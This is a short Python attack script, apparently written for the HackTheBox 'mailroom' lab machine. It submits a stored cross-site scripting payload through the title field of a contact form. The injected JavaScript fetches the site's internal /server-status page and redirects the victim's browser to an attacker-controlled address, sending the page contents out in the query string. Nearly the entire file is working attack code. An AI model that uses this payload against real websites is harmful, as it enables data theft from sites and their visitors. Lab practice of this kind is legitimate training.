import requests
import urllib.parse
from bs4 import BeautifulSoup
from typing import List
import consts


def main():
    base_url = "http://mailroom.htb"
    my_server_address = f"http://10.10.14.159:{consts.PORT}"

    payload = \
        f"""
        <script>
        fetch('{base_url}/server-status').then(function(response) {{
            return response.text();
        }}).then(function(string) {{
            document.location = "{my_server_address}/?content=" + string;
        }});
        </script>
        """
    response = requests.post(url=f"{base_url}/contact.php",
                             data={"email": "example_email",
                                   "title": payload,
                                   "message": "example_message"})
    inquiry = \
        f'{base_url}{list(filter(lambda x: "inquiries" in x["href"], BeautifulSoup(response.text, "html.parser").find_all("a", href=True)))[0]["href"][1:]}'

    print(payload)
    print(inquiry)


if __name__ == '__main__':
    main()
